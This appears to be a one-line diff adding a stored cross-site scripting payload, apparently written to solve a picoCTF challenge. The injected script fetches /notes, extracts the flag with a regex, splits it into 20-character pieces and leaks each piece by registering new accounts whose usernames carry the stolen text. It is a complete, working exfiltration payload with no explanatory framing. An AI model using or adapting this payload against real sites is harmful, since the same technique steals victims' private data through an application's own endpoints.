@@ -1,0 +1,1 @@
+<script>fetch('/notes').then(r=>r.text()).then(h=>{let m=h.match(/picoCTF\{[^}]+\}/);if(m){let f=m[0];for(let i=0;i<Math.ceil(f.length/20);i++){setTimeout(()=>fetch('/register',{method:'POST',body:new URLSearchParams({username:'p'+i+'_'+f.substring(i*20,(i+1)*20),password:'x'})}),i*600)}}})</script>
